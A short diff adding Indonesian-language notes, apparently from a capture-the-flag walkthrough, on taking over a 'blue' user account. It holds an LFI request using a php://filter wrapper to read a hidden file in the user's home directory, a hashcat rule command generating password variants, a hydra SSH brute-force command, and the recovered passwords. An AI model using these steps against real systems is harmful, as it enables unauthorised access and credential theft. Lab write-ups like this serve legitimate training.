@@ -1,0 +1,7 @@
+Dapat password di user blue setelah LFI `GET /index.php?page=php://filter/read=string.base64/resource=/home/blue/.reminder HTTP/1.1`
+	- sup3r_p@s$w0rd! <tapi TIDAK berguna>
+Tapi kita dapat hint sebelumnya bahwa Red suka mengganti password tapi relatively sama, selain itu terdapat aktifitas di `/home/blue/.bash_history` yang mana memberikan hint generate password, kita menggunakan cara yang sama pada password sebelumnya
+	- echo "sup3r_p@s\$w0rd!" | tee reminder
+	- `hashcat --stdout reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt`
+	- `hydra -l blue -P passlist.txt atlanta ssh -f`
+	- sup3r_p@s$w0rd!9 <password selalu ganti, jadi harus selalu hydra
